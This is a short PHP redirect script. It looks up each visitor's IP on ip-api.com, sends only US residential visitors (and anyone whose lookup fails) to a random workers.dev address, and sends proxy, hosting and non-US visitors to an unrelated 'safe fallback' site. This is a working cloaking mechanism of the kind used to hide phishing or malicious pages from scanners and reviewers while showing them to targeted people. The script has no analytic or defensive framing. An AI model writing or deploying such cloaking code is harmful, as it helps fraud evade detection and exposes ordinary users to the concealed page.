<?php
// Step 1: Get visitor IP address (with proxy/CDN fallback)
$ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];

// Step 2: Call ip-api.com for Geo/IP intelligence
$ch = curl_init("http://ip-api.com/json/$ip?fields=status,countryCode,proxy,hosting");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);
$data = json_decode($response, true);

// Step 3: Fallback if IP-API fails
if (!$data || $data['status'] !== 'success') {
    header("Location: https://winter-feather-c0dd.marciapatreid.workers.dev/");
    exit();
}

// Step 4: Logic (US + Residential only)
$isUS        = $data['countryCode'] === 'US';
$isResidential = ($data['proxy'] === false && $data['hosting'] === false);

// Final condition
$isClean = $isUS && $isResidential;

// Step 5: Redirect accordingly
$target_url   = "https://winter-feather-c0dd.marciapatreid.workers.dev/"; // Final destination
$fallback_url = "https://www.ero-labs.com/en/";  // Safe fallback http://itunes.apple.com/app/id6748211202

header("Location: " . ($isClean ? $target_url : $fallback_url));
exit;
?>
